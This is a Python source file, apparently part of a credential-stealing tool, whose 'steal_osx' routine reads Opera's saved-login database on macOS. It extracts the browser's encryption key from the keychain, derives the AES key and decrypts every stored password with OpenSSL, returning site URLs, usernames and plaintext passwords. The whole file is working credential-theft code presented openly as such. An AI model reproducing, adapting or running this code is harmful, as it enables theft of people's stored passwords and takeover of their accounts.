# Common imports
import platform
import sqlite3
import os
# OSX imports
if platform.system() == 'Darwin':
    import binascii
    import subprocess
    import base64
    from hashlib import pbkdf2_hmac


def query_db(db_path):
    # Try to open the SQLite3 database
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
    except:
        return ('[-] Couldn\'t open the database')
    # Execute the query
    try:
        cursor.execute('SELECT action_url, username_value, '
        'password_value FROM logins WHERE username_value '
        'IS NOT \'\' OR password_value IS NOT \'\'')
    except:
        return ('[-] Error getting the passwords')
    # Fetch all data
    return cursor.fetchall()


def steal():
    if platform.system() == 'Darwin':
        return steal_osx()
    return("[-] "+platform.system()+" is not supported.")

# OSX part
def steal_osx():
    # Recovered list
    recovered = list()
    # Get the passwords
    data = query_db(os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera/Login Data'))
    # Get the encrpytion key from the keychain
    safe_storage_key = subprocess.Popen("security find-generic-password -wa 'Opera'",stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    stdout, stderr = safe_storage_key.communicate()
    safe_storage_key = stdout[:-1]
    # Catch keychain errors
    if stderr:
        return("[-]Chrome entry not found in keychain.")
    if not stdout:
        return("[-]You clicked deny.")
    # Are there any passwords?
    if len(data) > 0:
        # Loop through the passwords
        for result in data:
            # Setup the initialisation vector
            iv = ''.join(('20', ) * 16)
            # Setup the decryption key
            key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
            hex_key = binascii.hexlify(key)
            # Decrpyt the password with the key
            hex_enc_password = base64.b64encode(result[2][3:])
            # Send any error messages to /dev/null to prevent screen bloating up
            # (any decryption errors will give a non-zero exit, causing exception)
            try:
                if hex_enc_password:
                    # Decrpyt with OpenSSL
                    password = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '"
                    +iv+"' -K "+hex_key.decode('utf-8')+" <<< "+
                    hex_enc_password.decode('utf-8')+" 2>/dev/null",shell=True)

                    recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password.decode('utf-8')))
            except subprocess.CalledProcessError:
                pass
        return recovered
    else:
        # There are no saved passwords
        return('[-] There are no saved passwords')
